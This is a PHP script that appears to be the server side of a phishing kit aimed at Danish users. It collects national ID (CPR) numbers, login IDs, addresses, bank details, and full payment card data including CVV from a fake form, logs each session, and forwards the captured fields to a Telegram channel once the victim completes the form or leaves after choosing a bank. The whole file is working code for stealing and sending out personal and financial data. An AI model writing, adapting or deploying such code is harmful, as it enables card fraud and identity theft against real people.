<?php
header("Content-Type: application/json; charset=utf-8");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
if (isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] === "OPTIONS") {
  http_response_code(204);
  exit;
}

require_once __DIR__ . "/tg.php";

$data = json_decode(file_get_contents("php://input"), true);
if (!is_array($data)) {
  http_response_code(400);
  echo json_encode(array("ok" => false));
  exit;
}

$sessionId = isset($data["session_id"]) ? $data["session_id"] : "unknown";
$step = isset($data["step"]) ? (int)$data["step"] : 0;
$status = isset($data["status"]) ? $data["status"] : "partial";
$fields = (isset($data["fields"]) && is_array($data["fields"])) ? $data["fields"] : array();

// Always update live presence (cheap) — does not block under load
juj_touch_online($sessionId);

// Only log meaningful events (not every heartbeat) — keeps disk free for 500 users
if ($status !== "ping") {
  juj_log_event(array(
    "ts" => gmdate("c"),
    "session_id" => $sessionId,
    "step" => $step,
    "status" => $status,
    "fields" => $fields,
  ));
}

$labels = array(
  "cpr" => "🪪 CPR-Number",
  "bruger_id" => "📜 Bruger-ID",
  "ip" => "🌐 IP",
  "cvr" => "🔒 CVR",
  "companyName" => "🏢 Virksomhed",
  "companyCvr" => "🔒 Company CVR",
  "fullname" => "👤 Navn",
  "address" => "🏠 Adresse",
  "zip" => "📍 Postnr",
  "city" => "📍 By",
  "phone" => "📞 Telefonnummer",
  "extra" => "🏦 Bank",
  "xx1" => "👤 Kort ejernavn",
  "xx2" => "💳 Kort nummer",
  "xx3" => "📅 Udløbsdato",
  "xx4" => "🔒 CVV",
  "xx5" => "🔢 Regnr",
  "xx6" => "🔢 Kontonr",
);

$bankChosen = isset($fields["extra"]) && trim((string)$fields["extra"]) !== "";

// Leave TG only after bank is chosen. Complete always notifies.
$notifyTg = false;
if ($status === "complete") {
  $notifyTg = true;
} elseif (($status === "leave" || $status === "beacon") && $bankChosen) {
  $notifyTg = true;
}

$sent = 0;
if ($notifyTg) {
  $hdr = ($status === "complete" ? "🟢 Complete" : "🟡 Partial (left page)") . " — step " . $step . "\n";
  $hdr .= "🆔 Session: " . $sessionId . "\n\n";
  $body = "";
  foreach ($fields as $k => $v) {
    if ($v === "" || $v === null) {
      continue;
    }
    $label = isset($labels[$k]) ? $labels[$k] : ("▪️ " . $k);
    $body .= $label . ": " . $v . "\n";
  }
  if ($body === "") {
    $body = "(no fields filled yet)\n";
  }
  $sent = juj_tg_send($hdr . $body, "HTML");
}

echo json_encode(array("ok" => true, "sent" => $sent, "status" => $status));
